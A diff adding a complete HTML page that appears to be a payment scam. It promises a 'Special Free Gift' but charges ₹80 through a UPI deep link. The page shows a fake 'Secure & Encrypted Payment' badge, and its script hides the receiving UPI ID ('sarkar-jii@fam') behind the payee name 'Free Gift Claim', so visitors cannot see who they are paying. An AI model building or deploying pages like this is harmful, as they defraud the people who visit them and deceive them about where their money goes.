@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Special Gift | UPI Payment</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Animated gift icons in background */
+        .gift-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .gift-icon {
+            position: absolute;
+            font-size: 24px;
+            color: rgba(255, 255, 255, 0.5);
+            animation-name: fall;
+            animation-timing-function: linear;
+            animation-iteration-count: infinite;
+        }
+        
+        @keyframes fall {
+            from {
+                transform: translateY(-100px) rotate(0deg);
+            }
+            to {
+                transform: translateY(100vh) rotate(360deg);
+            }
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .header {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            padding: 30px 20px;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .main-gift-icon {
+            font-size: 80px;
+            margin: 20px 0;
+            color: #6a11cb;
+            animation: pulse 1.5s infinite;
+            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .content h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .content p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .price-tag {
+            background: linear-gradient(to right, #ff8a00, #ff2070);
+            color: white;
+            display: inline-block;
+            padding: 8px 25px;
+            border-radius: 50px;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 15px 0;
+            box-shadow: 0 5px 15px rgba(255, 138, 0, 0.3);
+        }
+        
+        .payment-button {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 25px 0 15px;
+            box-shadow: 0 8px 20px rgba(38, 117, 252, 0.4);
+            transition: all 0.3s ease;
+        }
+        
+        .payment-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(38, 117, 252, 0.5);
+            background: linear-gradient(to right, #2575fc, #6a11cb);
+        }
+        
+        .payment-button:active {
+            transform: translateY(0);
+        }
+        
+        .instructions {
+            text-align: left;
+            background: #e8f4ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .instructions h3 {
+            color: #2575fc;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+            color: #555;
+        }
+        
+        .instructions li {
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+        
+        .footer {
+            padding: 20px;
+            color: #777;
+            font-size: 14px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+        }
+        
+        .secure-note {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+            color: #28a745;
+            font-weight: 600;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 15px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .price-tag {
+                font-size: 20px;
+            }
+            
+            .payment-button {
+                padding: 15px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated gift icons in background -->
+    <div class="gift-rain" id="giftRain"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1>Special Free Gift Offer!</h1>
+            <p>Claim your gift by completing the payment process</p>
+        </div>
+        
+        <div class="content">
+            <i class="fas fa-gift main-gift-icon"></i>
+            
+            <h2>Claim Your Exclusive Gift</h2>
+            <p>Click the button below to claim your free gift by completing a minimal payment verification process.</p>
+            
+            <div class="price-tag">Only ₹80</div>
+            
+            <button class="payment-button" onclick="initiatePayment()">
+                <i class="fas fa-gift"></i> FREE GIFT CLAIM
+            </button>
+            
+            <div class="instructions">
+                <h3>How to claim your gift:</h3>
+                <ol>
+                    <li>Click on the "FREE GIFT CLAIM" button above</li>
+                    <li>Your UPI app will automatically open with payment details</li>
+                    <li>Complete the payment of ₹80 to receive your gift</li>
+                    <li>You will receive confirmation within 24 hours</li>
+                </ol>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 Gift Offer. All rights reserved.</p>
+            <div class="secure-note">
+                <i class="fas fa-shield-alt"></i>
+                <span>Secure & Encrypted Payment</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Create falling gift icons in background
+        function createGiftRain() {
+            const giftRain = document.getElementById('giftRain');
+            const gifts = ['🎁', '🎉', '🎀', '🎊', '🛍️', '💝'];
+            const colors = ['#ff6b6b', '#ff8a00', '#6a11cb', '#2575fc', '#42a5f5', '#4ecdc4'];
+            
+            for (let i = 0; i < 40; i++) {
+                const gift = document.createElement('div');
+                gift.className = 'gift-icon';
+                gift.textContent = gifts[Math.floor(Math.random() * gifts.length)];
+                gift.style.left = Math.random() * 100 + 'vw';
+                gift.style.animationDuration = (Math.random() * 5 + 5) + 's';
+                gift.style.animationDelay = (Math.random() * 5) + 's';
+                gift.style.color = colors[Math.floor(Math.random() * colors.length)];
+                gift.style.opacity = Math.random() * 0.5 + 0.3;
+                gift.style.fontSize = (Math.random() * 20 + 15) + 'px';
+                giftRain.appendChild(gift);
+            }
+        }
+        
+        // Initialize gift rain
+        createGiftRain();
+        
+        // UPI Payment function
+        function initiatePayment() {
+            // UPI ID is hidden but used in the payment link
+            const upiId = 'sarkar-jii@fam';
+            const amount = '80';
+            const name = 'Free Gift Claim';
+            const transactionNote = 'Free Gift Claim Payment';
+            
+            // Create UPI payment URL
+            const upiUrl = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tn=${encodeURIComponent(transactionNote)}`;
+            
+            // Redirect to UPI payment
+            window.location.href = upiUrl;
+            
+            // Fallback: If UPI app not installed, open UPI apps list
+            setTimeout(function() {
+                window.location.href = 'https://play.google.com/store/search?q=upi&c=apps';
+            }, 500);
+        }
+    </script>
+</body>
+</html>
